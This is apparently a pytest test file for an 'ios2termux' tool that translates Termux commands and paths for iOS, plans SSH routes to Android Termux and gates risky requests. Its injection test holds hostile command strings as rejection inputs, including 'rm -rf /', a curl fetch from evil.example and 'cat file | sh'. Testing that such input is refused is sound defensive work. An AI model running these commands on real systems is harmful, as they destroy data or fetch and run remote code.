import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from ios2termux.brains import evaluate
from ios2termux.carbon4 import (
    DEFAULT_TIER, ENGINE, MODEL_ID, THINKING_TIERS, Carbon4,
)
from ios2termux.freeai import MUSE_MODELS, SEATS, detected
from ios2termux.planner import cheat_sheet_md, plan, setup_termux_sh, ssh_config_snippet
from ios2termux.routes import BY_KEY, RECOMMENDED_KEY, ROUTES, honest_verdict
from ios2termux.translate import (
    TRANSLATIONS, translate_command, translate_path,
)
from ios2termux.blackbox import BlackBox


# --- honesty ---------------------------------------------------------------

def test_termux_on_ios_is_impossible():
    v = honest_verdict()
    assert v["termux_runs_natively_on_ios"] is False
    assert v["can_install_termux_apk_on_ios"] is False


def test_no_jailbreak_required():
    assert honest_verdict()["jailbreak_required"] is False
    assert all(not r.needs_jailbreak for r in ROUTES)


def test_ish_is_shell_not_termux():
    v = honest_verdict()
    assert v["ish_is_termux"] is False and v["ish_runs_shell"] is True


def test_recommended_route_is_ssh_to_android_termux():
    assert RECOMMENDED_KEY == "ssh_to_android_termux"
    assert BY_KEY[RECOMMENDED_KEY].is_real_termux is True


def test_at_least_eight_routes_with_two_impossible():
    assert len(ROUTES) >= 8
    impossible = [r for r in ROUTES if r.category == "impossible"]
    assert {r.key for r in impossible} == {"termux_on_ios", "apk_on_ios"}


# --- translation -----------------------------------------------------------

def test_at_least_14_translations():
    assert len(TRANSLATIONS) >= 14


def test_translate_pkg_install_both_directions():
    assert translate_command("pkg install python", "to_ios") == "apk add python"
    assert translate_command("apk add python", "to_termux") == "pkg install python"


def test_translate_open_and_clipboard():
    assert translate_command("termux-open a.txt", "to_ios") == "open a.txt"
    assert translate_command("pbcopy", "to_termux") == "termux-clipboard-set"
    assert translate_command("termux-clipboard-get", "to_ios") == "pbpaste"


def test_translate_tts_and_sshd():
    assert translate_command("termux-tts-speak hello", "to_ios") == "say hello"
    assert translate_command("sshd", "to_ios") == "ssh"


def test_translate_no_equivalent_returns_none():
    assert translate_command("termux-setup-storage", "to_ios") is None
    assert translate_command("termux-wake-lock", "to_ios") is None


def test_translate_unknown_returns_none():
    assert translate_command("some-random-tool --flag", "to_ios") is None


@pytest.mark.parametrize("evil", [
    "pkg install x; rm -rf /",
    "pkg install $(curl http://evil.example/x.sh)",
    "pkg install `id`",
    "cat file | sh",
    "pkg install x && rm -rf ~/storage",
])
def test_injection_is_rejected(evil):
    with pytest.raises(ValueError):
        translate_command(evil, "to_ios")


def test_path_shared_downloads_both_directions():
    assert translate_path("~/storage/downloads", "to_ios") == "On My iPhone/Downloads"
    assert translate_path("On My iPhone/Downloads", "to_termux") == "~/storage/downloads"


def test_path_private_downloads_has_no_shared_equivalent():
    assert translate_path("~/downloads", "to_ios") is None


def test_path_home_and_prefix():
    assert translate_path("/data/data/com.termux/files/home", "to_ios") == "~"
    assert translate_path("/data/data/com.termux/files/usr", "to_ios") == "/usr"


# --- brains / HOLD gates ----------------------------------------------------

def test_gate_native_termux_claim():
    assert any(g.trigger == "native_termux_claim"
               for g in evaluate({"claim_native_termux": True}))
    assert any(g.trigger == "native_termux_claim"
               for g in evaluate({"route": "termux_on_ios"}))


def test_gate_apk_install_on_ios():
    assert any(g.trigger == "apk_install_on_ios"
               for g in evaluate({"install_apk_on_ios": True}))


def test_gate_jailbreak_required():
    assert any(g.trigger == "jailbreak_required"
               for g in evaluate({"requires_jailbreak": True}))


def test_gate_sshd_public_no_auth():
    assert any(g.trigger == "sshd_public_no_auth"
               for g in evaluate({"expose_sshd_public": True}))
    assert evaluate({"expose_sshd_public": True, "key_auth": True}) == []


def test_gate_secrets_in_command_history():
    assert any(g.trigger == "secrets_in_command_history"
               for g in evaluate({"secret_in_command": True}))


def test_gate_rm_rf_storage():
    assert any(g.trigger == "rm_rf_storage"
               for g in evaluate({"command": "rm -rf ~/storage"}))


def test_gate_unextracted_archive_run():
    assert any(g.trigger == "unextracted_archive_run"
               for g in evaluate({"run_from_zip": True}))


def test_gate_private_downloads_confusion():
    gates = evaluate({"target_path": "~/downloads", "expect_shared": True})
    assert any(g.trigger == "private_downloads_confusion" for g in gates)
    ok = evaluate({"target_path": "~/storage/downloads", "expect_shared": True})
    assert ok == []


def test_clean_request_no_gates():
    assert evaluate({"route": "ssh_to_android_termux"}) == []


# --- Carbon 4 ----------------------------------------------------------------

def test_carbon4_house_pattern():
    assert ENGINE == "gemini-2.5-pro"
    assert MODEL_ID == "google/gemini-carbon-4-extended-pro-thinking"
    assert THINKING_TIERS == {"standard": 2048, "deep": 8192, "extended": 32768}
    assert DEFAULT_TIER == "extended"
    assert Carbon4().thinking_budget == 32768


def test_carbon4_negative_control_translation():
    d = Carbon4().decide("translate_command",
                         {"route": "ish_shell", "command": "pkg install python"})
    assert d["verdict"] == "PROCEED"


def test_carbon4_negative_control_local_ish():
    d = Carbon4().decide("run_on_ios",
                         {"route": "ish_shell", "command": "ls"})
    assert d["verdict"] == "PROCEED"
    d2 = Carbon4().decide("run_on_ios",
                          {"route": "ish_shell", "command": "python3 script.py"})
    assert d2["verdict"] == "PROCEED"


def test_carbon4_negative_control_benign_transfer():
    d = Carbon4().decide("transfer_file",
                         {"route": "ios_files_transfer",
                          "target_path": "~/storage/downloads"})
    assert d["verdict"] == "PROCEED"


def test_carbon4_gate_wins_hold():
    d = Carbon4().decide("run_on_ios",
                         {"route": "termux_on_ios", "claim_native_termux": True})
    assert d["verdict"] == "HOLD"
    assert any("native_termux_claim" in r for r in d["reasons"])


def test_carbon4_phases_present():
    d = Carbon4().decide("ssh_connect", {"route": "ssh_to_android_termux"})
    assert list(d["phases"]) == ["MAP", "MODEL", "STRESS", "DECIDE"]
    assert d["verdict"] == "PROCEED"


# --- planner -------------------------------------------------------------------

def test_ssh_plan_proceeds_with_port_8022():
    p = plan("ssh_to_android_termux")
    assert p.ok and not p.gates
    assert any("ssh -p 8022" in c for c in p.commands)
    assert "pkg install openssh" in p.commands
    assert "sshd" in p.commands and "whoami" in p.commands


def test_ssh_plan_generated_files():
    p = plan("ssh_to_android_termux")
    assert "setup-termux.sh" in p.files
    assert "pkg install openssh" in p.files["setup-termux.sh"]
    assert "8022" in p.files["ssh_config"]
    assert "apk add" in p.files["translate-cheat-sheet.md"]


def test_setup_and_config_helpers():
    assert "sshd" in setup_termux_sh()
    assert "Port 8022" in ssh_config_snippet()
    assert "pkg install" in cheat_sheet_md()


def test_cloud_plan_codespaces():
    p = plan("cloud_termux")
    assert p.ok
    assert any("Codespaces" in s for s in p.phone_steps)


def test_transfer_plan_storage_and_unzip():
    p = plan("ios_files_transfer")
    assert p.ok
    assert any("~/storage/downloads" in c for c in p.commands)
    assert any("unzip" in c for c in p.commands)
    assert any("termux-setup-storage" in c for c in p.commands)
    assert any("Allow" in s for s in p.phone_steps)


def test_native_plan_is_hold():
    p = plan("termux_on_ios")
    assert not p.ok and p.gates


def test_unknown_route_raises():
    with pytest.raises(ValueError):
        plan("nope")


# --- blackbox + freeai ---------------------------------------------------------

def test_blackbox_chain_verifies():
    box = BlackBox()
    box.log("verdict", {"ok": True})
    box.log("ssh-plan", {"ok": True})
    assert box.verify() is True


def test_freeai_names_only():
    assert SEATS["muse"] == "MODEL_API_KEY"
    assert SEATS["gemini"] == "GEMINI_API_KEY"
    assert SEATS["claude"] == "ANTHROPIC_API_KEY"
    assert MUSE_MODELS == ("muse-spark-1.1", "muse-wonder-1.0")
    assert all(s in SEATS for s in detected())
